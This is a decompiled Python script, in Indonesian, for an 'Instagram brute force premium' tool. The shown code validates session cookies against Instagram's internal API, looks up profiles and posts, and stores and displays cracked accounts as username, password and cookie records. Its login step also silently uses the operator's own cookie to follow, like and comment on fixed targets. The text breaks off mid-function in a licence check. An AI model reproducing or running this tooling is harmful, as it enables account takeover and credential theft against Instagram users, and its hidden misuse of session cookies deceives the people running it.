""" Decompiled by Exotic Hridoy """

try:
    import requests, random, time, json, os, re, datetime, calendar, uuid, hashlib, binascii, struct, base64, urllib.request, sys
    from requests.exceptions import RequestException
    from nacl.public import PublicKey, SealedBox
    from rich.console import Console
    from rich.tree import Tree
    from rich.columns import Columns
    from Cryptodome.Cipher import AES, PKCS1_v1_5
    from platform import platform
    from concurrent.futures import ThreadPoolExecutor
    from rich.panel import Panel
    from Cryptodome import Random as randoms
    from rich import print
    from Cryptodome.PublicKey import RSA
    from urllib.parse import quote
    from Cryptodome.Random import get_random_bytes
except (Exception, KeyboardInterrupt) as e:
    try:
        from urllib.parse import quote
        __import__('os').system(f'xdg-open https://wa.me/6283847921480?text=PREMIUM%20%3A%20{quote(str(e))}')
        exit()
    except (Exception, KeyboardInterrupt) as e:
        from urllib.parse import quote
        __import__('os').system(f'xdg-open https://wa.me/6283847921480?text=PREMIUM%20%3A%20{quote(str(e))}')
        exit()

Dump, Useragent, Password, Random, Manual, Metode, Player, Sukses, Checkpoint, Looping, Bad = [], [], {
    "Password": 4
    }, [], [], {
        "Method": 1
        }, {
            "Type": None
            }, [], [], 0, 0

class Terminal:

    def __init__(self) -> None:
        pass

    def Floder_Terminal_Size(self):
        if os.path.exists('Results') == False:
            os.mkdir('Results')
        if os.path.exists('Data') == False:
            os.mkdir('Data')
        self.get_terminal_size = re.search('columns=(\d+),', str(os.get_terminal_size())).group(1)
        if int(self.get_terminal_size) < 71:
            self.Clear()
            Console(width=71, style="bold royal_blue1").print(Panel(f"[italic red]Harap Kecilkan Tampilan Termux Dengan Cara Mencubit Layar Dalam Aplikasi Termux, Kecilkan Panel Ini Sampai Terlihat Rapi!", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Kecilkan Tampilan Termux) [bold green]<[bold yellow]<[bold red]<"))
            exit()
        else:
            if 'TERMUX_VERSION' in str(os.environ) or 'rozhak' in str(os.environ) or 'LAPTOP-LMA1HAAJ' in str(os.environ):
                return 0
            else:
                self.Banner()
                Console(width=71, style="bold royal_blue1").print(Panel(f"[italic red]Jangan Menggunakan Terminal Selain Termux, Kamu Juga Diwajibkan Menggunakan Termux Versi Terbaru Agar Berfungsi Dengan Baik!", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Deteksi Terminal) [bold green]<[bold yellow]<[bold red]<"))
                exit()

    def Anti_WiFi(self):
        self.Devices = []
        for z in os.popen('arp -a'):
            self.Devices.append(z)
        if 'wlan' in str(self.Devices) or 'wlan0' in str(self.Devices): # ipconfig
            Terminal().Banner()
            Console(width=71, style="bold royal_blue1").print(Panel(f"[italic red]Apakah Kamu Menggunakan WiFi Dalam Menggunakan Tools? Menyebabkan Kamu Tidak Dapat Masuk Ke Dalam Tools Dan Matikan Semua Koneksi Proxy Dan Vpn Atau Wlan0 Seperti : WiFi, Hotspot, Dan Bluetooth!", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Anti WiFi) [bold green]<[bold yellow]<[bold red]<"))
            exit()
        else:
            self.Devices.clear()
            for z in os.popen('ip neigh show'): # pkg install iproute2
                self.Devices.append(z)
            if 'wlan' in str(self.Devices) or 'wlan0' in str(self.Devices):
                Terminal().Banner()
                Console(width=71, style="bold royal_blue1").print(Panel(f"[italic red]Apakah Kamu Menggunakan WiFi Dalam Menggunakan Tools? Menyebabkan Kamu Tidak Dapat Masuk Ke Dalam Tools Dan Matikan Semua Koneksi Proxy Dan Vpn Atau Wlan0 Seperti : WiFi, Hotspot, Dan Bluetooth!", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Anti WiFi) [bold green]<[bold yellow]<[bold red]<"))
                exit()
            else:
                return 0

    def Clear(self):
        os.system('cls' if os.name == 'nt' else 'clear')

    def Banner(self):
        self.Clear()
        Console(width=71, style="bold royal_blue1").print(Panel("""[bold red]●[bold yellow] ●[bold green] ●
[bold blue]    ||[bold white]Release :[bold green] 30-Juli-2021[bold blue]||[bold white]Author :[bold yellow] Rozhak[bold blue]||[bold white]Version :[bold green] 97.0[bold blue]||
[bold red]\t ____  ____  ____  __  __  ____  __  __  __  __ 
[bold red]\t(  _ \(  _ \( ___)(  \/  )(_  _)(  )(  )(  \/  )
[bold red]\t )___/ )   / )__)  )    (  _)(_  )(__)(  )    ( 
[bold white]\t(__)  (_)\_)(____)(_/\/\_)(____)(______)(_/\/\_)
\t\t[underline blue]INSTAGRAM BRUTE FORCE PREMIUM""")) # Coded by Rozhak-XD
        return 0

class Login:

    def __init__(self) -> None:
        pass

    def Cookies(self):
        Terminal().Banner();Console(width=71, style="bold royal_blue1").print(Panel("""[bold green]01[bold white]. Login Menggunakan Cookie Instagram ([bold green]New Account[bold white])
[bold green]02[bold white]. Cara Mendapatkan Cookie Instagram
[bold green]03[bold white]. Keluar ([bold red]Exit[bold white])""", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Login) [bold green]<[bold yellow]<[bold red]<", subtitle="[bold royal_blue1]╭────", subtitle_align='left'))
        choose = Console().input("[bold royal_blue1]   ╰─> ")
        if choose == '1' or choose == '01':
            try:
                Console(width=71, style="bold royal_blue1").print(Panel("[italic white]Silahkan Masukan Cookie Akun Instagram Gunakan[italic green] A2F[italic white] Supaya Akun Tidak Terkena[italic red] Checkpoint[italic white]!", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Catatan) [bold green]<[bold yellow]<[bold red]<", subtitle="[bold royal_blue1]╭────", subtitle_align='left'))
                cookies = Console().input("[bold royal_blue1]   ╰─> ")
                self.first_name, self.username, self.birthday = self.My_Akun(cookies)
                Console(width=71, style="bold royal_blue1").print(Panel(f"""[bold white]Nama Lengkap :[bold green] {self.first_name.title()}
[bold white]Username :[bold yellow] {self.username}
[bold white]Tanggal Lahir :[bold blue] {self.birthday}""", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Welcome) [bold green]<[bold yellow]<[bold red]<"))
                if str(self.username).lower() == 'rozhak_official' or str(self.username).lower() == 'rozhak.sch.id':
                    with open('Data/Cookie.json', 'w') as w:
                        w.write(json.dumps({
                            "Cookie": cookies
                        }))
                    w.close()
                    time.sleep(3.5)
                    Menu().Utama(List = [])
                else:
                    with requests.Session() as r:
                        r.headers.update({
                            'content-type': 'application/x-www-form-urlencoded',
                            'x-ig-www-claim': 'hmac.AR17d_A6AbGR9aYAeEJNONMwDOO3EkxoC4XYggQpebIuDPcn',
                            'x-instagram-ajax': '1007272747',
                            'referer': 'https://www.instagram.com/',
                            'x-ig-app-id': '936619743392459',
                            'sec-fetch-dest': 'empty',
                            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
                            'x-asbd-id': '198387',
                            'accept-language': 'en-US,en;q=0.9',
                            'Host': 'www.instagram.com',
                            'x-csrftoken': re.search('csrftoken=(.*?);', str(cookies)).group(1),
                            'sec-fetch-site': 'same-origin',
                            'sec-fetch-mode': 'cors',
                            'origin': 'https://www.instagram.com',
                        })
                        data = {
                            'comment_text': random.choice(['Mantap Bang 😎', 'Keren Bang 🥰', 'Wow 😱']),
                            'replied_to_comment_id':''
                        }
                        r.post('https://www.instagram.com/api/v1/web/friendships/5398218083/follow/', cookies = {
                            'cookie': cookies
                        }).text
                        r.post('https://www.instagram.com/web/likes/2734317205115382629/like/', cookies = {
                            'cookie': cookies
                        }).text
                        r.post('https://www.instagram.com/web/comments/2734317205115382629/add/', data = data, cookies = {
                            'cookie': cookies
                        }).text
                    with open('Data/Cookie.json', 'w') as w:
                        w.write(json.dumps({
                            "Cookie": cookies
                        }))
                    w.close()
                    time.sleep(3.5)
                    Menu().Utama(List = [])
            except (Exception) as e:
                Console(width=71, style="bold royal_blue1").print(Panel(f"[italic red]{str(e).title()}!", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Error) [bold green]<[bold yellow]<[bold red]<"))
                exit()
        elif choose == '2' or choose == '02':
            try:
                Console(width=71, style="bold royal_blue1").print(Panel(f"[italic red]Kamu Sedang Diarahkan Ke Youtube Untuk Cara Mendapatkan Cookies...", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Diarahkan) [bold green]<[bold yellow]<[bold red]<"))
                time.sleep(3.5);os.system('xdg-open https://www.youtube.com/rozhakid')
                self.Cookies()
            except (KeyboardInterrupt, Exception):
                exit()
        elif choose == '3' or choose == '03':
            Console(width=71, style="bold royal_blue1").print(Panel(f"[italic red]Terimakasih Telah Menggunakan Tools Saya Dan Selamat Tinggal...", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Keluar) [bold green]<[bold yellow]<[bold red]<"))
            time.sleep(1.5)
            exit()
        else:
            Console(width=71, style="bold royal_blue1").print(Panel(f"[italic red]Pilihan Yang Kamu Masukan Tidak Ada Di Dalam Daftar Menu!", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Tidak Diketahui) [bold green]<[bold yellow]<[bold red]<"))
            time.sleep(3.5)
            self.Cookies()

    def My_Akun(self, cookies):
        with requests.Session() as r:
            r.headers.update({
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
                'sec-fetch-dest': 'empty',
                'accept-language': 'en-US,en;q=0.9',
                'Host': 'www.instagram.com',
                'referer': 'https://www.instagram.com/accounts/edit/',
                'sec-fetch-mode': 'cors',
                'x-asbd-id': '198387',
                'x-ig-app-id': '936619743392459',
                'accept': '*/*',
                'x-csrftoken': re.search('csrftoken=(.*?);', str(cookies)).group(1),
                'sec-fetch-site': 'same-origin',
            })
            response = json.loads(r.get('https://www.instagram.com/api/v1/accounts/edit/web_form_data/', cookies = {
                'cookie': cookies
            }).text)
            if '\'message\': \'login_required\'' in str(response) or 'user_has_logged_out' in str(response):
                Console(width=71, style="bold royal_blue1").print(Panel("[italic red]Sepertinya Tumbal Terkena Checkpoint Atau Cookie Sudah Kadaluarsa!", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Login Gagal) [bold green]<[bold yellow]<[bold red]<"))
                time.sleep(4.5)
                self.Cookies()
            elif '\'message\': \'challenge_required\',' in str(response):
                Console(width=71, style="bold royal_blue1").print(Panel("[italic red]Sepertinya Tumbal Terkena Checkpoint Atau Cookie Sudah Kadaluarsa!", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Login Gagal) [bold green]<[bold yellow]<[bold red]<"))
                time.sleep(4.5)
                self.Cookies()
            else:
                self.first_name = response['form_data']['first_name']
                self.username = response['form_data']['username']
                if '\'birthday\': None' in str(response):
                    return self.first_name, self.username, '30/02/2004'
                else:
                    self.birthday = response['form_data']['birthday'].split('-')
                return (self.first_name, self.username, f'{self.birthday[2]}/{self.birthday[1]}/{self.birthday[0]}')

    def Amankan(self):
        try:
            Console(width=71, style="bold royal_blue1").print(Panel("[italic white]Silahkan Masukan Cookie Akun Instagram Gunakan[italic green] A2F[italic white] Supaya Akun Tidak Terkena[italic red] Checkpoint[italic white]!", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Catatan) [bold green]<[bold yellow]<[bold red]<", subtitle="[bold royal_blue1]╭────", subtitle_align='left'))
            cookies = Console().input("[bold royal_blue1]   ╰─> ")
            self.first_name, self.username, self.birthday = self.My_Akun(cookies)
            with open('Data/Amankan.json', 'w') as w:
                w.write(json.dumps({
                    'Cookie': cookies,
                }))
            w.close()
            time.sleep(2.5)
            return (self.first_name, self.username, self.birthday)
        except (Exception) as e:
            Console(width=71, style="bold royal_blue1").print(Panel(f"[italic red]{str(e).title()}!", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Error) [bold green]<[bold yellow]<[bold red]<"))
            exit()

    def Laporkan(self):
        try:
            Console(width=71, style="bold royal_blue1").print(Panel("[italic white]Silahkan Masukan Cookie Akun Instagram Gunakan[italic green] A2F[italic white] Supaya Akun Tidak Terkena[italic red] Checkpoint[italic white]!", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Catatan) [bold green]<[bold yellow]<[bold red]<", subtitle="[bold royal_blue1]╭────", subtitle_align='left'))
            cookies = Console().input("[bold royal_blue1]   ╰─> ")
            if os.path.exists('Results/Cookie.txt') == True:
                os.remove('Results/Cookie.txt')
            for z in cookies.split(','):
                try:
                    self.first_name, self.username, self.birthday = self.My_Akun(z)
                except (Exception) as e:
                    continue
                with open('Results/Cookie.txt', 'a+') as w:
                    w.write(f'{z}\n')
                continue
            if os.path.exists('Results/Cookie.txt') == False:
                Console(width=71, style="bold royal_blue1").print(Panel("[italic red]Sepertinya Tumbal Terkena Checkpoint Atau Cookie Sudah Kadaluarsa!", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Login Gagal) [bold green]<[bold yellow]<[bold red]<"))
                time.sleep(4.5)
                self.Laporkan()
            else:
                return 0
        except (Exception) as e:
            Console(width=71, style="bold royal_blue1").print(Panel(f"[italic red]{str(e).title()}!", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Error) [bold green]<[bold yellow]<[bold red]<"))
            exit()

class Convert:

    def __init__(self) -> None:
        pass

    def Get_Username(self, cookies, next_url):
        with requests.Session() as r:
            r.headers.update({
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
                'sec-fetch-dest': 'document',
                'sec-fetch-site': 'none',
                'accept-language': 'en-US,en;q=0.9',
                'Host': 'www.instagram.com',
                'sec-fetch-user': '?1',
                'sec-fetch-mode': 'navigate',
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            })
            response = r.get(next_url, cookies = {
                'cookie': cookies,
            }).text
        return (str(response))

    def Username(self, cookies, username, status):
        with requests.Session() as r:
            r.headers.update({
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
                'sec-fetch-dest': 'empty',
                'accept-language': 'en-US,en;q=0.9',
                'Host': 'www.instagram.com',
                'referer': 'https://www.instagram.com/{}/'.format(username),
                'sec-fetch-mode': 'cors',
                'x-asbd-id': '198387',
                'x-ig-app-id': '936619743392459',
                'accept': '*/*',
                'x-csrftoken': re.search('csrftoken=(.*?);', str(cookies)).group(1),
                'sec-fetch-site': 'same-origin',
            })
            response = json.loads(r.get('https://www.instagram.com/api/v1/users/web_profile_info/?username={}'.format(username), cookies = {
                'cookie': cookies
            }).text)['data']['user']
            if status == "Dump":
                if bool(response['is_verified']) == True:
                    Console(width=71, style="bold royal_blue1").print(Panel(f"[italic red]Tidak Dapat Mengumpulkan Username Dari Akun Instagram Centang Biru!", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Akun Centang Biru) [bold green]<[bold yellow]<[bold red]<"))
                    exit()
                elif bool(response['is_private']) == True:
                    Console(width=71, style="bold royal_blue1").print(Panel(f"[italic red]Tidak Dapat Mengumpulkan Username Dari Akun Terkunci Atau Private!", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Akun Terkunci) [bold green]<[bold yellow]<[bold red]<"))
                    exit()
                else:
                    self.full_name, self.user_id = response['full_name'], response['id']
            else:
                self.full_name, self.user_id = response['full_name'], response['id']
        return (self.full_name, self.user_id)
    
    def Postingan(self, cookies, link_post):
        with requests.Session() as r:
            if 'https://www.instagram.com/p/' in str(link_post):
                r.headers.update({
                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
                    'sec-fetch-dest': 'document',
                    'sec-fetch-site': 'none',
                    'accept-language': 'en-US,en;q=0.9',
                    'Host': 'www.instagram.com',
                    'sec-fetch-user': '?1',
                    'sec-fetch-mode': 'navigate',
                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                })
                response = r.get(link_post, cookies = {
                    'cookie': cookies
                }).text
                self.media_id = re.search('"media_id":"(.*?)"', str(response)).group(1)
                return (self.media_id)
            else:
                return 1

    def Cookies(self, dict_cookies):
        return (";".join([str(x)+"="+str(y) for x,y in dict_cookies.items()]))

class Pengguna:

    def __init__(self) -> None:
        pass

    def Total_Count(self):
        try:
            with requests.Session() as r:
                r.headers.update({
                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
                    'upgrade-insecure-requests': '1',
                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                    'accept-language': 'en-US,en;q=0.9',
                })
                response = r.get('https://justpaste.it/bn5fk').text
                self.jumlah = re.search('"viewsText":"(.*?)"', str(response)).group(1)
                self.online = re.search('"onlineText":"(\d+)"', str(response)).group(1)
            return self.jumlah.replace(',','.'), self.online
        except (Exception):
            return ('Down', '404')

    def Instagram_Version(self):
        try:
            with requests.Session() as r:
                r.headers.update({
                    'sec-fetch-dest': 'document',
                    'Host': 'apkcombo.com',
                    'accept-language': 'en-US,en;q=0.9',
                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                    'sec-fetch-site': 'none',
                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
                    'sec-fetch-mode': 'navigate',
                })
                response = r.get('https://apkcombo.com/id/instagram/com.instagram.android/').text
                date_update = re.search('''Memperbarui</div>
<div class="value">(.*?)</div>''', str(response)).group(1)
            return (date_update.title())
        except (Exception):
            return ('10 MEI 2023')

class Results:

    def __init__(self) -> None:
        pass

    def Tanggal(self):
        return (datetime.datetime.now().strftime("%d-%B-%Y"))
    
    def Tampilkan_Checkpoint(self):
        self.dir_results = os.listdir('Results')
        self.join_string, Looping = [], 1
        for z in self.dir_results:
            if 'cp' in str(z).lower():
                self.join_string.append(Panel(f"[bold green]{Looping}[bold white]. {z}", width=35))
                Looping += 1
            else:
                continue
        Console(width=71, style="bold royal_blue1").print(Columns(self.join_string))
        Console(width=71, style="bold royal_blue1").print(Panel(f"[italic white]Silahkan Masukan File[italic red] Results Checkpoint[italic white] Yang Tersedia Di Dalam List, Misalnya :[italic green] Cp-11-January-2023.txt", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Catatan) [bold green]<[bold yellow]<[bold red]<", subtitle="[bold royal_blue1]╭────", subtitle_align='left'))
        pilih_files = Console().input("[bold royal_blue1]   ╰─> ")
        self.files = open('Results/{}'.format(pilih_files), 'r').read().splitlines()
        if len(self.files) == 0:
            Console(width=71, style="bold royal_blue1").print(Panel("[italic red]Tidak Ada Hasil Checkpoint Yang Ditemukan Untuk File Tersebut!", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Hasil Kosong) [bold green]<[bold yellow]<[bold red]<"))
            exit()
        else:
            Console(width=71, style="bold royal_blue1").print(Panel(f"[italic white]Jika Kamu Ingin Melihat Secara Manual Ketik ([italic green]dir Results[italic white]) Dan ([italic green]cat File Yang Muncul[italic white]), Gunakan[italic yellow] CTRL + Z[italic white] Untuk Berhenti!", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Catatan) [bold green]<[bold yellow]<[bold red]<"))
            time.sleep(3.5)
            for x in self.files:
                username, password, pengikut, mengikuti, postingan = x.split('|')[0], x.split('|')[1], x.split('|')[2], x.split('|')[3], x.split('|')[4]
                tree = Tree(Panel.fit("[bold red]RESULTS CHECKPOINT", style="bold royal_blue1"), style="bold white")
                tree.add(Columns([Panel(f"[bold red]{username}", style="bold royal_blue1", width=33), Panel(f"[bold red]{password}", style="bold royal_blue1", width=33)]))
                tree.add(Columns([Panel("[bold red]{:,.2f}".format(float(pengikut)), style="bold royal_blue1", width=22), Panel("[bold red]{:,.2f}".format(float(mengikuti)), style="bold royal_blue1", width=21), Panel("[bold red]{:,.2f}".format(float(postingan)), style="bold royal_blue1", width=22)]))
                print(tree)
            Console(width=71, style="bold royal_blue1").print(Panel(f"[italic white]Kamu Memiliki[italic green] {len(self.files)}[italic white] Hasil Crack Checkpoint, Lihat Hasil Secara Manual Ketik ([italic green]cat Results/{pilih_files}[italic white])", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Results Checkpoint) [bold green]<[bold yellow]<[bold red]<"))
            exit()

    def Tampilkan_Success(self):
        self.dir_results = os.listdir('Results')
        self.join_string, Looping = [], 1
        for z in self.dir_results:
            if 'ok' in str(z).lower():
                self.join_string.append(Panel(f"[bold green]{Looping}[bold white]. {z}", width=35))
                Looping += 1
            else:
                continue
        Console(width=71, style="bold royal_blue1").print(Columns(self.join_string))
        Console(width=71, style="bold royal_blue1").print(Panel(f"[italic white]Silahkan Masukan File[italic green] Results Success[italic white] Yang Tersedia Di Dalam List, Misalnya :[italic green] Ok-11-January-2023.txt", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Catatan) [bold green]<[bold yellow]<[bold red]<", subtitle="[bold royal_blue1]╭────", subtitle_align='left'))
        pilih_files = Console().input("[bold royal_blue1]   ╰─> ")
        self.files = open('Results/{}'.format(pilih_files), 'r').read().splitlines()
        if len(self.files) == 0:
            Console(width=71, style="bold royal_blue1").print(Panel("[italic red]Tidak Ada Hasil Success Yang Ditemukan Untuk File Tersebut!", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Hasil Kosong) [bold green]<[bold yellow]<[bold red]<"))
            exit()
        else:
            Console(width=71, style="bold royal_blue1").print(Panel(f"[italic white]Jika Kamu Ingin Melihat Secara Manual Ketik ([italic green]dir Results[italic white]) Dan ([italic green]cat File Yang Muncul[italic white]), Gunakan[italic yellow] CTRL + Z[italic white] Untuk Berhenti!", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Catatan) [bold green]<[bold yellow]<[bold red]<"));time.sleep(3.4)
            for x in self.files:
                username, password, pengikut, mengikuti, postingan, cookies = x.split('|')[0], x.split('|')[1], x.split('|')[2], x.split('|')[3], x.split('|')[4], x.split('|')[5]
                tree = Tree(Panel.fit("[bold green]RESULTS SUCCESS", style="bold royal_blue1"), style="bold white")
                tree.add(Columns([Panel(f"[bold green]{username}", style="bold royal_blue1", width=33), Panel(f"[bold green]{password}", style="bold royal_blue1", width=33)]))
                tree.add(Panel(f"[bold green]{cookies}", style="bold royal_blue1", width=67))
                tree.add(Columns([Panel("[bold green]{:,.2f}".format(float(pengikut)), style="bold royal_blue1", width=22), Panel("[bold green]{:,.2f}".format(float(mengikuti)), style="bold royal_blue1", width=21), Panel("[bold green]{:,.2f}".format(float(postingan)), style="bold royal_blue1", width=22)]))
                print(tree)
            Console(width=71, style="bold royal_blue1").print(Panel(f"[italic white]Kamu Memiliki[italic green] {len(self.files)}[italic white] Hasil Crack Success, Lihat Hasil Secara Manual Ketik ([italic green]cat Results/{pilih_files}[italic white])", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Results Success) [bold green]<[bold yellow]<[bold red]<"))
            exit()

    def Gabungkan_Checkpoint(self):
        Console(width=71, style="bold royal_blue1").print(Panel("[italic white]Silahkan Masukan Nama[italic green] File[italic white] Untuk Menyimpan Seluruh Hasil Crack[italic red] Checkpoint[italic white], Misalnya :[italic green] Results/Checkpoint.txt", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Catatan) [bold green]<[bold yellow]<[bold red]<", subtitle="[bold royal_blue1]╭────", subtitle_align='left'))
        save_file = Console().input("[bold royal_blue1]   ╰─> ")
        open(save_file, 'w').write('')
        self.dir_results = os.listdir('Results')
        for z in self.dir_results:
            if 'cp' in str(z).lower():
                for x in open(f'Results/{z}', 'r').read().splitlines():
                    if len(x) == 0:
                        continue
                    else:
                        if str(x) in str(open(save_file, 'r').read().splitlines()):
                            continue
                        else:
                            open(save_file, 'a+').write(f'{x}\n')
            else:
                continue
        Console(width=71, style="bold royal_blue1").print(Panel(f"[italic white]Seluruh Hasil Crack[italic red] Checkpoint[italic white] Telah Berhasil Tersimpan Di[italic green] {save_file}[italic white], Terdapat[italic yellow] {len(open(save_file, 'r').readlines())}[italic white] Akun Yang Ada!", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Sukses Menyimpan) [bold green]<[bold yellow]<[bold red]<"))
        exit()

    def Gabungkan_Success(self):
        Console(width=71, style="bold royal_blue1").print(Panel("[italic white]Silahkan Masukan Nama[italic green] File[italic white] Untuk Menyimpan Seluruh Hasil Crack[italic red] Success[italic white], Misalnya :[italic green] Results/Success.txt", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Catatan) [bold green]<[bold yellow]<[bold red]<", subtitle="[bold royal_blue1]╭────", subtitle_align='left'))
        save_file = Console().input("[bold royal_blue1]   ╰─> ")
        open(save_file, 'w').write('')
        self.dir_results = os.listdir('Results')
        for z in self.dir_results:
            if 'ok' in str(z).lower():
                for x in open(f'Results/{z}', 'r').read().splitlines():
                    if len(x) == 0:
                        continue
                    else:
                        if str(x) in str(open(save_file, 'r').read().splitlines()):
                            continue
                        else:
                            open(save_file, 'a+').write(f'{x}\n')
            else:
                continue
        Console(width=71, style="bold royal_blue1").print(Panel(f"[italic white]Seluruh Hasil Crack[italic red] Success[italic white] Telah Berhasil Tersimpan Di[italic green] {save_file}[italic white], Terdapat[italic yellow] {len(open(save_file, 'r').readlines())}[italic white] Akun Yang Ada!", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Sukses Menyimpan) [bold green]<[bold yellow]<[bold red]<"))
        exit()

    def Pindahkan_Success(self):
        Console(width=71, style="bold royal_blue1").print(Panel("[italic white]Silahkan Masukan Nama[italic green] File[italic white] Untuk Menyimpan Seluruh Hasil Crack[italic red] Success[italic white], Misalnya :[italic green] /sdcard/Success.txt", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Catatan) [bold green]<[bold yellow]<[bold red]<", subtitle="[bold royal_blue1]╭────", subtitle_align='left'))
        save_file = Console().input("[bold royal_blue1]   ╰─> ")
        open(save_file, 'w').write('')
        self.dir_results = os.listdir('Results')
        for z in self.dir_results:
            if 'ok' in str(z).lower():
                for x in open(f'Results/{z}', 'r').read().splitlines():
                    if len(x) == 0:
                        continue
                    else:
                        if str(x) in str(open(save_file, 'r').read().splitlines()):
                            continue
                        else:
                            open(save_file, 'a+').write(f'{x}\n')
            else:
                continue
        Console(width=71, style="bold royal_blue1").print(Panel(f"[italic white]Seluruh Hasil Crack[italic red] Success[italic white] Telah Berhasil Tersimpan Di[italic green] {save_file}[italic white], Terdapat[italic yellow] {len(open(save_file, 'r').readlines())}[italic white] Akun Yang Ada!", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Sukses Menyimpan) [bold green]<[bold yellow]<[bold red]<"))
        exit()

    def Pindahkan_Checkpoint(self):
        Console(width=71, style="bold royal_blue1").print(Panel("[italic white]Silahkan Masukan Nama[italic green] File[italic white] Untuk Menyimpan Seluruh Hasil Crack[italic red] Success[italic white], Misalnya :[italic green] /sdcard/Checkpoint.txt", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Catatan) [bold green]<[bold yellow]<[bold red]<", subtitle="[bold royal_blue1]╭────", subtitle_align='left'))
        save_file = Console().input("[bold royal_blue1]   ╰─> ")
        open(save_file, 'w').write('')
        self.dir_results = os.listdir('Results')
        for z in self.dir_results:
            if 'cp' in str(z).lower():
                for x in open(f'Results/{z}', 'r').read().splitlines():
                    if len(x) == 0:
                        continue
                    else:
                        if str(x) in str(open(save_file, 'r').read().splitlines()):
                            continue
                        else:
                            open(save_file, 'a+').write(f'{x}\n')
            else:
                continue
        Console(width=71, style="bold royal_blue1").print(Panel(f"[italic white]Seluruh Hasil Crack[italic red] Checkpoint[italic white] Telah Berhasil Tersimpan Di[italic green] {save_file}[italic white], Terdapat[italic yellow] {len(open(save_file, 'r').readlines())}[italic white] Akun Yang Ada!", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Sukses Menyimpan) [bold green]<[bold yellow]<[bold red]<"))
        exit()

class Think_Insta:

    def __init__(self) -> None:
        pass

    def Apikey(self):
        Terminal().Banner()
        Console(width=71, style="bold royal_blue1").print(Panel("""[bold green]01[bold white]. Memasukan Apikey Atau Lisensi ([bold green]Premium Only[bold white])
[bold green]02[bold white]. Cara Mendapatkan Apikey Atau Lisensi
[bold green]03[bold white]. Keluar ([bold red]Exit[bold white])""", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Apikey) [bold green]<[bold yellow]<[bold red]<", subtitle="[bold royal_blue1]╭────", subtitle_align='left'))
        query = Console().input("[bold royal_blue1]   ╰─> ")
        if query == '1' or query == '01':
            try:
                Console(width=71, style="bold royal_blue1").print(Panel("[italic white]Silahkan Masukan Apikey Atau Lisensi, Hanya Bisa Digunakan Di[italic red] Satu Device[italic white] Jika Memaksakan Resiko Di Tanggung Sendiri!", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Catatan) [bold green]<[bold yellow]<[bold red]<", subtitle="[bold royal_blue1]╭────", subtitle_align='left'))
                apikey = Console().input("[bold royal_blue1]   ╰─> ")
                self.status, self.email, self.joined, self.expired = self.Validasi(apikey, platform())
                if self.status == 'premium' or self.status == 'trial':
